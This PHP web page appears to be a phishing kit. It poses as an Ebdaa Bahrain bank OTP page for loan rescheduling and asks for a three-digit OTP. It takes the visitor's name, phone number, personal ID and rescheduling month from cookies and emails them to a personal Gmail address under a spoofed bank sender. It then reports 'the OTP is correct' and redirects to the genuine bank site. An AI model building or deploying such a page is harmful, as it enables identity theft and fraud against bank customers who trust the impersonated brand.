<!DOCTYPE HTML>  
<html>
<head>
<title> OTP ألابداع </title>
<link rel="shortcut icon" href="assets\favicon.ico">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<style>
select.M1
{
	text-align:Right;
}

.center
{
	text-align:center;
}

.save
{
  background-color: #61D2B4; 
  border: none;
  color: white;
  padding: 14px 40px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 10px 10px;
  transition-duration: 0.4s;
  cursor: pointer;
  background-color: red;
  color: black;
  border: 2px solid #61D2B4;
  border-radius: 8px;
}
.contenar
{
	text-align:center;
}
img {
  border-radius: 8px;
    max-width: 50%;
    margin-left: auto;
    margin-right: auto;
    display: block;
 
}

input[type=text], select {
  width: 40%;
  padding: 10px 15px;
  max-width: 100%;
  margin-left: auto;
  margin-right: auto;
  display: inline-block;
  border: 1px solid #61D2B4;
  border-radius: 4px;
  box-sizing: border-box;
  text-align:right;
  
}
input[type=submit]
{
  background-color: #61D2B4; 
  border: none;
  color: white;
  padding: 14px 40px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  transition-duration: 0.4s;
  cursor: pointer;
  background-color: white;
  color: black;
  border: 2px solid #61D2B4;
  border-radius: 8px;
}

input[type=submit]:hover {
  background-color:#61D2B4;
}
input[type=reset]
{
  background-color: #61D2B4; /* Green */
  border: none;
  color: white;
  padding: 14px 40px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  transition-duration: 0.4s;
  cursor: pointer;
  background-color: white;
  color: black;
  border: 2px solid #61D2B4;
  border-radius: 8px;
 
}

input[type=reset]:hover {
  background-color: #61D2B4;
}
.error {color: #FF0000;}
div {
  border-radius: 1px;
  background-color: #fff;
  padding: 5px;
}
.h1 {
  padding: 15px;
  text-align: center;
  color: #3BA8A2;
  font-size: 15px;
  
}
.container {
  position: relative;
  padding-left: 35px;
  margin-bottom: 12px;
  cursor: pointer;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
 
}

.container input {
  position: absolute;
  opacity: 0;
  cursor: pointer;
  height: 0;
  width: 0;
}

.checkmark {
  position: absolute;
  top: 0;
  left: 0;
  height: 25px;
  width: 25px;
  background-color: #61D2B4;
}

.container:hover input ~ .checkmark {
  background-color: #ccc;
}

.container input:checked ~ .checkmark {
  background-color: #61D2B4;
}

.checkmark:after {
  content: "";
  position: absolute;
  display: none;
}

.container input:checked ~ .checkmark:after {
  display: block;
}
.container .checkmark:after {
  left: 9px;
  top: 5px;
  width: 5px;
  height: 10px;
  border: solid white;
  border-width: 0 3px 3px 0;
  -webkit-transform: rotate(45deg);
  -ms-transform: rotate(45deg);
  transform: rotate(45deg);
}
.note
{
  padding: 15px;
  color: red;
  font-size: 18px;
}
</style>
</head>
<body>
 

<?php

$OTPc2=$OTP_err2=$OTP2="";
$Name=$ID=$Number=$Email=$month=$OTP=$succes=$Body2="";


if ($_SERVER["REQUEST_METHOD"] == "POST")
{

// id chaking 
  if (empty($_POST["OTP"]))
  {
    $OTP_err2 = " Enter OTP Number || الرجاء ادخال رقم التعريف ";
  }
    elseif((strlen($_POST["OTP"]) < 3))
  {
    $OTP_err2 = " OTP Number is Incorrect ||رقم التعريف غير صحيح  ";
  }
  else
  {
    $OTPc2= is_numeric($_POST["OTP"]);
  }
  if ($OTPc2==1)
  {
	$OTP2 = $_POST["OTP"];
  }
  else 
  {
	$OTP_err2 = " OTP Number is Incorrect || رقم التعريف غير صحيح ";
  }

	if (isset($_POST["submit"]))
  {
      if (empty($OTP_err2))
	  {
		  $OTP = $_COOKIE['OTP'];
$Name = $_COOKIE['Name'];
$Number = $_COOKIE['Number'];
$ID = $_COOKIE['ID'];
$month = $_COOKIE['Month'];
		$selected = $message=$errorMSG = "";
		$EmailTo2 = "sayedooo96@gmail.com";
		$Subject2 = " Dleay the Loan";
		$EmailFrom2 = "It@ebdaabank.com";
		$Body2 = "
		<html>
		<head>
		</head>
		<body style='background-color: #e4e4e4; direction: rtl; font-size:20px;'>
		<div style='width:100%;height:10%;'></div>
		<table cellspacing='0' style='border-collapse: collapse; border: 8px black; width: 80%; min-height: 40%; margin:50px auto; background-color:white'>
        <tr>
		<th style='border: 2px solid black; width:10%;'>Name<br>الاسم</th>
		<td style='border: 2px solid black; width:30%;text-align: center;'>$Name</td>
		<th style='border: 2px solid black; width:10%;'> Phone number <br> رقم الهاتف </th>
		<td style='border: 2px solid black; width:10%;text-align: center;'>$Number</td>
		<th style='border: 2px solid black; width:10%;'> Parsonal ID <br> الرقم الشخصي </th>
		<td style='border: 2px solid black; width:10%;text-align: center;'>$ID</td>
        </tr>
		<tr>
        <th rowspan='5' style='border: 2px solid black; width:15%;'>  Rescheduling  <br>  أعادة جدولة  </th>
        <td rowspan='5' colspan='5' style='border: 2px solid black; width:35%;text-align: center;'>$month</td>
		</tr>
        </table>
        <div style='width:100%;height:15%;'></div>
        </body>
		</html>
        ";

		$headers2 = "From: " . $EmailFrom2 . "\r\n";
		$headers2 .= "MIME-Version: 1.0\r\n";
		$headers2 .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		
		$succes = mail( $EmailTo2 , $Subject2 , $Body2 , $headers2 );
		echo $Body2;
	}
	if ($succes)
{
	echo " <script type='text/javascript'>setTimeout('correct()',1); </script> ";
}

}
}
?>
<form accept-charset="UTF-8" action="ebdaaotp.php" role="form" method="post" >
<P>
<img src="assets/img/ebdaa2.jpg" alt="Italian Trulli" alt="Ebdaa Bahrain" width="1000" height="160" class="center">
</p>
<div class="contenar">
<h1 class="modal-title" id="OTP">Enter OTP Number || الرجاء ادخال رقم التعريف</h1>  
<p>
<input type="text" placeholder=" OTP Number || رقم التعريف "name="OTP" maxlength="3" required>
<p>
<span class="error" ><?php echo $OTP_err2;?></span>
</p>
</p>
<div class="modal-footer">
<input id="otherForm-submitBtn" class="monitored-btn" type="submit" name="submit"   >
</div>
</div>
</div>
<script>
function correct()
{
  alert("the OTP is correct");
  window.location=("https://www.ebdaabahrain.com/");
  window.close();
}
</script>
</form>
</body>
</html>
